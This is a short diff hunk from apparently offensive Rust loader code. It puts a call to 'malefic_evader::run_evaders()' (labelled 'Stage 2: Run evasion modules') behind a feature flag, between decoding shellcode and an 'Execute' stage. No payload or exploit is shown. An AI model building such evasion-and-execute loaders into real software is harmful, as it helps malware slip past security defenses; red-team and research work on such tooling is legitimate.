@@ -240,6 +240,7 @@ pub unsafe fn run(
     let shellcode = Shellcode::new(decoded);
 
     // Stage 2: Run evasion modules
+    #[cfg(feature = "evader")]
     malefic_evader::run_evaders();
 
     // Stage 3: Execute
